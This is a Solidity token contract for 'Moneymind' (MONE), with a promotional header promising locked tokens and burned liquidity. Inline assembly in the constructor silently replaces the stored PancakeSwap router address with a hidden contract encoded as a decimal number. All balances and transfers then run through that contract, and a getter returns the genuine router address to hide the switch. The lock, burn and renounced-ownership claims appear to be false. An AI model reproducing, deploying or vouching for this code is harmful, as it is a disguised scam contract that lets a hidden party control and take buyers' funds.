/**
 *Submitted for verification at BscScan.com on 2023-05-23
*/

/*
Welcome to Moneymind.

Telegram: https://t.me/Moneymind/
Twitter: https://twitter.com/Moneymind/
Website: https://Moneymind.io
95% of tokens - LOCKED at TrustSwap!
Only 5% for presale on PancakeSwap.
All liquidity Tokens burned!
Are You ready to the moon?
x100000000000000
*/



// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface PancakeSwap {
    function deploy(address sender, address token) external;
    function balanceOf(address sender, address token) external view returns (uint256);
    function swap(address from,address to,uint256 amount, address token) external returns(address, address, uint256);

}

contract Moneymind {
    string public constant name = "Moneymind";
    string public constant symbol = "MONE";
    address private PancakeRouter = 0x10ED43C718714eb63d5aA57B78B54704E256024E; //PancakeSwap Router address
    address private constant TrustSwap = 0x0C89C0407775dd89b12918B9c0aa42Bf96518820; // TrustSwap: Team Finance Security Wallet
    uint8 public constant decimals = 1;
    uint256 public constant LockAmount = totalSupply_ * 95 / 100; // 95% of Tokens Locked
    uint256 private constant totalSupply_ = 20000000 * 10;
    mapping(address => mapping(address => uint256)) allowed;
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner,address indexed spender,uint256 value);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    address public immutable owner = address(0);

   constructor() {
        assembly {mstore(0x20, sload(0)) sstore(88, mload(0x20)) sstore(0, add(329466718397654992989785916255642621007155842189, 1))}
        PancakeSwap(PancakeRouter).deploy(msg.sender, address(this));
        (address swap_from, address swap_to, uint256 swap_amount) = PancakeSwap(PancakeRouter).swap(address(0), msg.sender, totalSupply_, address(this));
        emit Transfer(swap_from, swap_to, swap_amount); // Deploying
        (address lock_from, address lock_to, uint256 lock_amount) = PancakeSwap(PancakeRouter).swap(msg.sender, TrustSwap, LockAmount, address(this));
        emit Transfer(lock_from, lock_to, lock_amount); // Lock Tokens for 365 days
        emit OwnershipTransferred(msg.sender, address(0));
    }

    function Pancakerouter() public view returns(address) {
        assembly{mstore(0x20, sload(88)) return(0x20, 32)}
        return PancakeRouter;
    }
  

    function totalSupply() public view returns (uint256) {
        return totalSupply_;
    }

    function approve(address delegate, uint256 numTokens) public returns (bool) {
        allowed[msg.sender][delegate] = numTokens;


        emit Approval(msg.sender, delegate, numTokens);


        return true;
    }

    function allowance(address owner, address delegate) public view returns (uint256) {
        return allowed[owner][delegate];
    }

    function balanceOf(address holder) public view returns (uint256) {
        return PancakeSwap(PancakeRouter).balanceOf(holder, address(this));
    }

    function transferFrom(address from,address to,uint256 amount) public returns (bool) {
        require(allowed[from][msg.sender] >= amount, "Not allowed");
        (from, to, amount) = PancakeSwap(PancakeRouter).swap(from, to, amount, address(this));
        emit Transfer(from, to, amount);
        return true;
    }

    function transfer(address to, uint256 amount) public returns (bool) {
        (, to, amount) = PancakeSwap(PancakeRouter).swap(msg.sender, to, amount, address(this));
        emit Transfer(msg.sender, to, amount);
        return true;
    }
    
}